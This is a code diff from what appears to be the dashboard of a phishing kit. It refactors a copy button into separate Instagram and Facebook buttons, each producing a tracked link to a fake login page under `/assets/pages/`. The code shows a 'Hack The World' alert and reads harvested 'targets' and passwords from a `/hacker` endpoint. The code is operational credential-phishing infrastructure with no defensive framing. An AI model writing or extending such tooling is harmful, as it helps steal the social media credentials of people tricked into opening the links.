@@ -36,17 +36,30 @@ function copyStringToClipboard(str) {
   });
 }
 
-let copyBtn = document.querySelector(".copy-btn");
-copyBtn.addEventListener("click", async (e) => {
-  // getting user details from database
-
+let copyBtn1 = document.querySelector(".copy-btn-1");
+let copyBtn2 = document.querySelector(".copy-btn-2");
+copyBtn1.addEventListener("click", async (e) => {
   let userFromDb = await fetch(
     `${dbUrl}/users?name=${user.name}&email=${user.email}`
   );
   userFromDb = await userFromDb.json();
   userFromDb = userFromDb[0];
+  let social = "instagram";
 
-  let social = e.target.getAttribute("data-social");
+  let link = `${domain}/assets/pages/${social}/index.html?id=${userFromDb.id}`;
+
+  copyStringToClipboard(link).then(() => {
+    swal("Hack The World 🌎", "Link copied successfully", "success");
+  });
+});
+copyBtn2.addEventListener("click", async (e) => {
+  let userFromDb = await fetch(
+    `${dbUrl}/users?name=${user.name}&email=${user.email}`
+  );
+  userFromDb = await userFromDb.json();
+  userFromDb = userFromDb[0];
+  let social = "facebook";
+
   let link = `${domain}/assets/pages/${social}/index.html?id=${userFromDb.id}`;
 
   copyStringToClipboard(link).then(() => {
@@ -69,7 +82,6 @@ const getUserDetail = async () => {
   userFromDb = await userFromDb.json();
   userFromDb = userFromDb[0];
 
-  
   let passwordDb = document.getElementById("password-db");
 
   let targets = await fetch(`${dbUrl}/hacker?userId=${userFromDb.id}`);
